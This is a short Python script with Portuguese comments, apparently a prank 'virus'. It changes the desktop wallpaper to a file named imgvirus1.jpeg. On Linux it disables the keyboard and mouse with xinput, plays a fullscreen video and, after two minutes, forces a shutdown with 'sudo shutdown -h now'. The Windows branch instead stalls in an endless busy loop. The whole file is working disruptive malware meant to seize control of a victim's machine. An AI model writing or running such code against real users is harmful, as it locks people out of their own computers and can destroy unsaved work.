import platform, os, ctypes, subprocess, cv2, time, pyautogui


# Mudar wallpaper

sistema_operacional = platform.system()
caminho = os.path.dirname(os.path.abspath(__file__))
nome_arquivo_imagem = "imgvirus1.jpeg"
image_path = os.path.join(caminho, nome_arquivo_imagem)

SPI_SETDESKWALLPAPER = 20
command = f"gsettings set org.gnome.desktop.background picture-uri 'file://{image_path}'"

if (sistema_operacional.lower() == 'windows'):
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    pyautogui.FAILSAFE = False

    while True:
        pass
    

elif (sistema_operacional.lower() == 'linux'):
    subprocess.run(command, shell=True)
    # Desabilitar o mausepad e teclado (linux)

    disable_keyboard_command = "xinput float $(xinput list | grep 'AT Translated Set 2 keyboard' | awk '{print $7}' | cut -d'=' -f2)"
    disable_mouse_command = "xinput float $(xinput list | grep 'USB Optical Mouse' | awk '{print $7}' | cut -d'=' -f2)"

    subprocess.run(disable_keyboard_command, shell=True)
    subprocess.run(disable_mouse_command, shell=True)

else: print(sistema_operacional)

# Mostrar vídeo

nome_arquivo_video = 'vaqueiro.mp4'


video_file = os.path.join(caminho, nome_arquivo_video)
cap = cv2.VideoCapture(video_file)
if not cap.isOpened():
    print("Erro ao abrir o vídeo.")
    exit()

width = int(cap.get(3))
height = int(cap.get(4))

cv2.namedWindow("Video", cv2.WND_PROP_FULLSCREEN)
cv2.setWindowProperty("Video", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

while True:
    ret, frame = cap.read()

    if not ret:
        break

    # Mostra o quadro em tela cheia
    cv2.imshow("Video", frame)

    # Pressione a tecla 'q' para sair
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

cap.release()
cv2.destroyAllWindows()


# Desligar PC


tempo_para_desligar = 120

# Aguardar o tempo especificado
time.sleep(tempo_para_desligar)

# Comando para desligar o computador
comando_desligar = "sudo shutdown -h now"

# Executar o comando para desligar o computador
subprocess.run(comando_desligar, shell=True)
